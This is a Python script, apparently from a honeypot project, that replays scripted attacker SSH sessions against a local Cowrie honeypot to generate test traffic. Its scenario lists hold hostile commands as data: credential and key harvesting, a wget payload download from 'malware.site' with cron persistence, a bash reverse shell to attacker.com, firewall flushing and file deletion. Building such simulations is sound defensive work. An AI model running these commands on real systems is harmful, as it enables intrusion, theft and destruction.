"""
simulate_attack.py
==================
Simulates a realistic attacker SSH session against the Cowrie honeypot.
Uses paramiko interactive shell (invoke_shell) — required for Cowrie.
"""

import paramiko
import time
import random
import sys
import warnings

warnings.filterwarnings("ignore")  # suppress TripleDES deprecation noise

SCENARIOS = {
    "apt": {
        "label": "APT / Nation-State (slow recon)",
        "commands": [
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "ifconfig",
            "netstat -tulpn",
            "cat /etc/passwd",
            "find / -name '*.pem' 2>/dev/null",
            "cat /home/admin/.ssh/authorized_keys",
            "grep -r 'password' /etc 2>/dev/null",
            "cat /opt/app/.env",
            "env",
            "sudo -l",
            "ls -la /home",
            "cat /home/admin/.bash_history",
        ],
        "min_delay": 4.0,
        "max_delay": 12.0,
    },
    "bot": {
        "label": "Automated Bot (fast downloader)",
        "commands": [
            "cd /tmp",
            "wget http://malware.site/bot.sh",
            "chmod +x bot.sh",
            "ls -la",
            "cat /etc/passwd",
            "echo '*/5 * * * * /tmp/bot.sh' | crontab -",
            "ps aux",
            "uname -a",
        ],
        "min_delay": 0.05,
        "max_delay": 0.3,
    },
    "skiddie": {
        "label": "Script Kiddie (noisy & destructive)",
        "commands": [
            "whoami",
            "ls /",
            "cat /etc/shadow",
            "chmod 777 /etc/passwd",
            "echo 'hacker' > /var/www/html/index.html",
            "iptables -F",
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "rm -rf /tmp/*",
        ],
        "min_delay": 0.5,
        "max_delay": 3.0,
    },
}


def run_attack(scenario_key="apt", host="mirage_cowrie", port=2222,
               user="root", password="password123"):

    scenario = SCENARIOS.get(scenario_key, SCENARIOS["apt"])
    print(f"\n[MIRAGE] Starting simulation: {scenario['label']}")
    print(f"[MIRAGE] Target: {host}:{port}  |  User: {user}")
    print("-" * 55)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, port=port, username=user, password=password,
                       timeout=10, banner_timeout=10, auth_timeout=10)
        print("[+] Connected. Cowrie accepted credentials (honeypot working!)\n")

        # Open interactive shell — required for Cowrie
        shell = client.invoke_shell(term="xterm", width=220, height=50)
        time.sleep(1.5)  # wait for banner

        # Drain the banner
        if shell.recv_ready():
            banner = shell.recv(4096).decode("utf-8", errors="ignore")
            print("[Banner received from honeypot:]")
            print(banner.strip())
            print()

        for cmd in scenario["commands"]:
            delay = random.uniform(scenario["min_delay"], scenario["max_delay"])
            print(f"  [{delay:.1f}s] $ {cmd}")

            shell.send(cmd + "\n")
            time.sleep(delay)

            # Read response
            output = ""
            timeout = 2.0
            start = time.time()
            while time.time() - start < timeout:
                if shell.recv_ready():
                    chunk = shell.recv(4096).decode("utf-8", errors="ignore")
                    output += chunk
                else:
                    time.sleep(0.1)

            if output.strip():
                # Print first 3 lines of output
                lines = [l for l in output.strip().split("\n") if l.strip()][:3]
                for l in lines:
                    print(f"       {l}")

        print("\n[MIRAGE] Simulation complete. Disconnecting.")
        shell.close()

    except Exception as e:
        print(f"[-] Connection failed: {e}")
        print("    Make sure the Cowrie container is running: docker ps")
    finally:
        client.close()


if __name__ == "__main__":
    # Choose scenario from command line: python simulate_attack.py apt|bot|skiddie
    key = sys.argv[1] if len(sys.argv) > 1 else "apt"
    if key not in SCENARIOS:
        print(f"Unknown scenario '{key}'. Choose: {list(SCENARIOS.keys())}")
        sys.exit(1)
    run_attack(scenario_key=key)
